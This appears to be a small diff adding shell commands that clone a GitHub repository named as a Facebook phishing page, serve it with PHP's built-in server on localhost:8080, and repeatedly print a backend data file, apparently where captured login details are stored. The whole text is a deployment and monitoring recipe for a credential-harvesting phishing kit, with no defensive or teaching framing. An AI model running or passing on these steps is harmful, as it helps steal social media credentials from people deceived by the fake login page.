@@ -1,0 +1,4 @@
+  git clone https://github.com/ArchismanKarmakar/Facebook-Phishing-page-php.git
+  cd facebook-phising-page-project
+  php -S localhost:8080
+    watch -n 5 'cat backend/data.txt'
